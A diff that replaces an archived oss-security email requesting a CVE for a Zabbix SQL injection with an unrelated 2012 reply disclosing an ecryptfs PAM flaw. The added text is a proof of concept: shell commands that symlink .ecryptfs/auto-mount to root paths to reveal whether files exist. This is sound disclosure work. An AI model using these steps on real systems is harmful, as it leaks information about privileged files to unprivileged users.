@@ -1,32 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/07/27/6
-Message-ID: <20120727230502.GC2692@redhat.com>
-Date: Fri, 27 Jul 2012 17:05:02 -0600
-From: Vincent Danen <vdanen@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/07/14/2
+Message-ID: <CAHmME9pReF5h+nnAG5qn9CKeGQtJcg4EzgtQT7hns1A1QDLjeg@mail.gmail.com>
+Date: Sat, 14 Jul 2012 09:18:27 +0200
+From: "Jason A. Donenfeld" <Jason@...c4.com>
 To: oss-security@...ts.openwall.com
-Subject: Zabbix SQL injection flaw (CVE request)
+Cc: Tyler Hicks <tyhicks@...onical.com>, Kurt Seifried <kseifried@...hat.com>,  Marcus Meissner <meissner@...e.de>, Dan Rosenberg <dan.j.rosenberg@...il.com>
+Subject: Re: Re: ecryptfs headsup
 Content-Type: text/plain; charset=utf-8
 
-Could a CVE be assigned to this please?
+Looks like another issue with that pam module. I can determine whether
+or not any file exists as an unprivileged user:
 
-An SQL injection flaw was found in Zabbix, where input passed via the
-"itemid" parameter to popup_bitem.php is not properly sanitized before
-being used in an SQL query.
+We make sure that we have an existing root file and a non-existing root file:
+zx2c4@...g ~ $ sudo touch /root/this-file-exists
+zx2c4@...g ~ $ sudo rm -f /root/this-file-does-not-exist
 
-The report was against version 2.0.1, but the upstream bug report [1]
-indicates this also affects 1.8.x.  Upstream has patched [2] this, and
-there is a potential patch for 1.8.x [3].
+We double check that zx2c4 can't know about them:
+zx2c4@...g ~ $ stat /root/this-file-exists
+stat: cannot stat `/root/this-file-exists': Permission denied
+zx2c4@...g ~ $ stat /root/this-file-does-not-exist
+stat: cannot stat `/root/this-file-does-not-exist': Permission denied
+zx2c4@...g ~ $ ls /root
+ls: cannot open directory /root: Permission denied
 
-[1] https://support.zabbix.com/browse/ZBX-5348
-[2] http://git.zabbixzone.com/zabbix2.0/.git/commit/333a3a5542ba8a2c901c24b7bf5440f41f1f4f54
-[3] https://gist.github.com/3181678
+We replace .ecryptfs/auto-mount with a symlink to a root file that
+does not exist:
+zx2c4@...g ~ $ rm -f .ecryptfs/auto-mount
+zx2c4@...g ~ $ ln -s /root/this-file-does-not-exist .ecryptfs/auto-mount
 
-Other references:
 
-https://bugzilla.redhat.com/show_bug.cgi?id=843927
-https://bugs.gentoo.org/show_bug.cgi?id=428372
+And we see that our private directory doesn't get mounted:
+zx2c4@...g ~ $ sudo login zx2c4
+Password:
+Last login: Sat Jul 14 03:07:33 EDT 2012 on pts/5
+zx2c4@...g ~ $ mount|grep ecrypt
 
-Thanks.
+zx2c4@...g ~ $ exit
 
--- 
-Vincent Danen / Red Hat Security Response Team 
+We next replace .ecryptfs/auto-mount with a symlink to a root file
+that *does* exist:
+zx2c4@...g ~ $ rm -f .ecryptfs/auto-mount
+zx2c4@...g ~ $ ln -s /root/this-file-exists .ecryptfs/auto-mount
+
+And we see that it does in fact get mounted:
+zx2c4@...g ~ $ sudo login zx2c4
+Password:
+Last login: Sat Jul 14 03:09:10 EDT 2012 on pts/5
+zx2c4@...g ~ $ mount|grep ecrypt
+/home/zx2c4/.Private on /home/zx2c4/Private type ecryptfs
+(ecryptfs_check_dev_ruid,ecryptfs_sig=e38bb31e419c9f03,ecryptfs_fnek_sig=5e2b499985de965d,ecryptfs_cipher=aes,ecryptfs_key_bytes=16,ecryptfs_unlink_sigs)
+
+File existence disclosure.
